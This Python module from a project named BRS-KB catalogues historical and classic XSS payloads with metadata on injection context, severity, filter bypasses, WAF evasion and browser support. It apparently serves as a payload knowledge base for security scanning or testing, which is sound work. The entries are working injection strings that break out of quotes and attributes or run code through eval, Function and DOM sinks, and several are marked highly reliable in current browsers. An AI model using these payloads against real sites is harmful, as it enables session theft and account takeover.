# Project: BRS-KB
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: 2025-12-26 UTC
# Status: Created
# Telegram: https://t.me/EasyProTech

"""
Historical XSS Payloads

Classic XSS vectors from the history of web security.
Many still work in legacy applications.
"""

from ..models import PayloadEntry


BRS_KB_HISTORICAL_PAYLOADS = {
    # ============================================================
    # SAMY MYSPACE WORM (2005)
    # ============================================================
    "samy-worm-style": PayloadEntry(
        payload="<div style=\"background:url('javascript:alert(1)')\">",
        contexts=["html_content", "css_injection"],
        severity="high",
        cvss_score=7.5,
        description="Samy worm style technique (IE)",
        tags=["historical", "samy", "myspace"],
        bypasses=["style_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="low",
    ),
    "samy-worm-expression": PayloadEntry(
        payload='<div style="width:expression(alert(1))">',
        contexts=["html_content", "css_injection"],
        severity="high",
        cvss_score=7.5,
        description="Samy worm CSS expression",
        tags=["historical", "samy", "expression"],
        bypasses=["style_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="low",
    ),
    # ============================================================
    # CLASSIC RSNAKE VECTORS
    # ============================================================
    "rsnake-img-dynsrc": PayloadEntry(
        payload='<img dynsrc="javascript:alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="DYNSRC attribute (IE)",
        tags=["historical", "rsnake", "ie"],
        bypasses=["src_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="low",
    ),
    "rsnake-img-lowsrc": PayloadEntry(
        payload='<img lowsrc="javascript:alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="LOWSRC attribute (IE)",
        tags=["historical", "rsnake", "ie"],
        bypasses=["src_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="low",
    ),
    "rsnake-bgsound": PayloadEntry(
        payload='<bgsound src="javascript:alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="BGSOUND element (IE)",
        tags=["historical", "rsnake", "ie"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="low",
    ),
    "rsnake-layer": PayloadEntry(
        payload='<layer src="javascript:alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="LAYER element (Netscape)",
        tags=["historical", "rsnake", "netscape"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=[],
        reliability="low",
    ),
    "rsnake-ilayer": PayloadEntry(
        payload='<ilayer src="javascript:alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="ILAYER element (Netscape)",
        tags=["historical", "rsnake", "netscape"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=[],
        reliability="low",
    ),
    # ============================================================
    # VBSCRIPT VECTORS (IE)
    # ============================================================
    "vbscript-href": PayloadEntry(
        payload='<a href="vbscript:msgbox(1)">click</a>',
        contexts=["html_content", "url_injection"],
        severity="high",
        cvss_score=7.5,
        description="VBScript in href (IE)",
        tags=["historical", "vbscript", "ie"],
        bypasses=["protocol_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="low",
    ),
    "vbscript-img": PayloadEntry(
        payload='<img src="vbscript:msgbox(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="VBScript in img src (IE)",
        tags=["historical", "vbscript", "ie"],
        bypasses=["protocol_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="low",
    ),
    # ============================================================
    # LIVESCRIPT (NETSCAPE)
    # ============================================================
    "livescript-href": PayloadEntry(
        payload='<a href="livescript:alert(1)">click</a>',
        contexts=["html_content", "url_injection"],
        severity="high",
        cvss_score=7.5,
        description="LiveScript protocol (ancient)",
        tags=["historical", "livescript"],
        bypasses=["protocol_filters"],
        waf_evasion=True,
        browser_support=[],
        reliability="low",
    ),
    # ============================================================
    # MOCHA (NETSCAPE)
    # ============================================================
    "mocha-href": PayloadEntry(
        payload='<a href="mocha:alert(1)">click</a>',
        contexts=["html_content", "url_injection"],
        severity="high",
        cvss_score=7.5,
        description="Mocha protocol (ancient Netscape)",
        tags=["historical", "mocha"],
        bypasses=["protocol_filters"],
        waf_evasion=True,
        browser_support=[],
        reliability="low",
    ),
    # ============================================================
    # XBL (MOZILLA)
    # ============================================================
    "xbl-binding": PayloadEntry(
        payload="<div style=\"-moz-binding:url(data:text/xml,<xbl xmlns='http://www.mozilla.org/xbl'><binding id='x'><implementation><constructor>alert(1)</constructor></implementation></binding></xbl>)\">",
        contexts=["html_content", "css_injection"],
        severity="high",
        cvss_score=7.5,
        description="XBL binding (old Firefox)",
        tags=["historical", "xbl", "firefox"],
        bypasses=["style_filters"],
        waf_evasion=True,
        browser_support=["firefox"],
        reliability="low",
    ),
    # ============================================================
    # HTC BEHAVIORS (IE)
    # ============================================================
    "htc-behavior": PayloadEntry(
        payload='<div style="behavior:url(xss.htc)">',
        contexts=["html_content", "css_injection"],
        severity="high",
        cvss_score=7.5,
        description="HTC behavior file (IE)",
        tags=["historical", "htc", "ie"],
        bypasses=["style_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="low",
    ),
    # ============================================================
    # XML DATA ISLANDS (IE)
    # ============================================================
    "xml-data-island": PayloadEntry(
        payload='<xml id="x"><x><c><![CDATA[<img src="x" onerror="alert(1)">]]></c></x></xml><div datafld="c" dataformatas="html" datasrc="#x">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="XML data island binding (IE)",
        tags=["historical", "xml", "ie"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="low",
    ),
    # ============================================================
    # STYLE IMPORT (IE)
    # ============================================================
    "style-import-ie": PayloadEntry(
        payload="<style>@import url(javascript:alert(1))</style>",
        contexts=["html_content", "css_injection"],
        severity="high",
        cvss_score=7.5,
        description="Style @import javascript (IE)",
        tags=["historical", "style", "ie"],
        bypasses=["style_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="low",
    ),
    # ============================================================
    # CHARSET TRICKS
    # ============================================================
    "charset-utf7": PayloadEntry(
        payload="+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="UTF-7 encoding bypass",
        tags=["historical", "charset", "utf7"],
        bypasses=["encoding_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="low",
    ),
    "charset-hz-gb-2312": PayloadEntry(
        payload="~{<script>alert(1)</script>~}",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HZ-GB-2312 encoding bypass",
        tags=["historical", "charset", "hz"],
        bypasses=["encoding_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="low",
    ),
    # ============================================================
    # CLASSIC EVENT BYPASSES
    # ============================================================
    "classic-onload-body": PayloadEntry(
        payload='<body onload="alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Classic body onload",
        tags=["classic", "onload"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "classic-onclick": PayloadEntry(
        payload='<div onclick="alert(1)">click</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Classic onclick",
        tags=["classic", "onclick"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "classic-onmouseover": PayloadEntry(
        payload='<div onmouseover="alert(1)">hover</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Classic onmouseover",
        tags=["classic", "onmouseover"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "classic-onerror-img": PayloadEntry(
        payload='<img src="x" onerror="alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Classic img onerror",
        tags=["classic", "onerror"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # EVAL VARIATIONS
    # ============================================================
    "eval-direct": PayloadEntry(
        payload="eval('alert(1)')",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Direct eval call",
        tags=["classic", "eval"],
        bypasses=["eval_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "eval-indirect": PayloadEntry(
        payload="(1,eval)('alert(1)')",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Indirect eval call",
        tags=["classic", "eval", "indirect"],
        bypasses=["eval_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "eval-window": PayloadEntry(
        payload="window.eval('alert(1)')",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Window.eval call",
        tags=["classic", "eval"],
        bypasses=["eval_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # FUNCTION CONSTRUCTOR
    # ============================================================
    "function-constructor": PayloadEntry(
        payload="Function('alert(1)')()",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Function constructor",
        tags=["classic", "function"],
        bypasses=["function_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "function-constructor-new": PayloadEntry(
        payload="new Function('alert(1)')()",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="new Function constructor",
        tags=["classic", "function"],
        bypasses=["function_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "function-constructor-bracket": PayloadEntry(
        payload="[].constructor.constructor('alert(1)')()",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Array constructor chain",
        tags=["classic", "function", "array"],
        bypasses=["function_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # SETTIMEOUT/SETINTERVAL
    # ============================================================
    "setTimeout-string": PayloadEntry(
        payload="setTimeout('alert(1)',0)",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="setTimeout string execution",
        tags=["classic", "setTimeout"],
        bypasses=["timer_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "setInterval-string": PayloadEntry(
        payload="setInterval('alert(1)',0)",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="setInterval string execution",
        tags=["classic", "setInterval"],
        bypasses=["timer_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # LOCATION ASSIGNMENTS
    # ============================================================
    "location-href-assign": PayloadEntry(
        payload="location='javascript:alert(1)'",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Location assignment",
        tags=["classic", "location"],
        bypasses=["location_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "location-hash-eval": PayloadEntry(
        payload="eval(location.hash.slice(1))",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Eval location hash",
        tags=["classic", "location", "eval"],
        bypasses=["location_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # DOCUMENT.WRITE
    # ============================================================
    "document-write-script": PayloadEntry(
        payload="document.write('<script>alert(1)<\\/script>')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="document.write script injection",
        tags=["classic", "document.write"],
        bypasses=["document_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "document-writeln": PayloadEntry(
        payload="document.writeln('<script>alert(1)<\\/script>')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="document.writeln injection",
        tags=["classic", "document.writeln"],
        bypasses=["document_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # INNERHTML VARIATIONS
    # ============================================================
    "innerHTML-classic": PayloadEntry(
        payload="document.body.innerHTML='<img src=x onerror=alert(1)>'",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="innerHTML assignment",
        tags=["classic", "innerHTML"],
        bypasses=["innerhtml_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "outerHTML-classic": PayloadEntry(
        payload="document.body.outerHTML='<body><img src=x onerror=alert(1)></body>'",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="outerHTML assignment",
        tags=["classic", "outerHTML"],
        bypasses=["innerhtml_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "insertAdjacentHTML": PayloadEntry(
        payload="document.body.insertAdjacentHTML('beforeend','<img src=x onerror=alert(1)>')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="insertAdjacentHTML injection",
        tags=["classic", "insertAdjacentHTML"],
        bypasses=["innerhtml_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # CLASSIC JQUERY SINKS
    # ============================================================
    "jquery-html": PayloadEntry(
        payload="$('body').html('<img src=x onerror=alert(1)>')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="jQuery html() sink",
        tags=["classic", "jquery"],
        bypasses=["jquery_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "jquery-append": PayloadEntry(
        payload="$('body').append('<img src=x onerror=alert(1)>')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="jQuery append() sink",
        tags=["classic", "jquery"],
        bypasses=["jquery_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "jquery-selector": PayloadEntry(
        payload="$('<img src=x onerror=alert(1)>')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="jQuery selector XSS",
        tags=["classic", "jquery"],
        bypasses=["jquery_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # CLASSIC ESCAPING
    # ============================================================
    "escape-single-quote": PayloadEntry(
        payload="';alert(1);//",
        contexts=["js_string"],
        severity="high",
        cvss_score=7.5,
        description="Single quote escape",
        tags=["classic", "escape"],
        bypasses=["string_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "escape-double-quote": PayloadEntry(
        payload='";alert(1);//',
        contexts=["js_string"],
        severity="high",
        cvss_score=7.5,
        description="Double quote escape",
        tags=["classic", "escape"],
        bypasses=["string_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "escape-backtick": PayloadEntry(
        payload="${alert(1)}",
        contexts=["js_string"],
        severity="high",
        cvss_score=7.5,
        description="Template literal escape",
        tags=["classic", "escape", "template"],
        bypasses=["string_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "escape-backslash": PayloadEntry(
        payload="\\';alert(1);//",
        contexts=["js_string"],
        severity="high",
        cvss_score=7.5,
        description="Backslash escape bypass",
        tags=["classic", "escape", "backslash"],
        bypasses=["string_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # HTML ATTRIBUTE ESCAPING
    # ============================================================
    "attr-escape-quote": PayloadEntry(
        payload='" onclick="alert(1)"',
        contexts=["html_attribute"],
        severity="high",
        cvss_score=7.5,
        description="Attribute quote escape",
        tags=["classic", "attribute"],
        bypasses=["attr_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "attr-escape-close": PayloadEntry(
        payload='"><script>alert(1)</script>',
        contexts=["html_attribute"],
        severity="high",
        cvss_score=7.5,
        description="Attribute to tag escape",
        tags=["classic", "attribute"],
        bypasses=["attr_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "attr-escape-event": PayloadEntry(
        payload='" autofocus onfocus="alert(1)"',
        contexts=["html_attribute"],
        severity="high",
        cvss_score=7.5,
        description="Attribute to event escape",
        tags=["classic", "attribute"],
        bypasses=["attr_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
}

BRS_KB_HISTORICAL_TOTAL_PAYLOADS = len(BRS_KB_HISTORICAL_PAYLOADS)
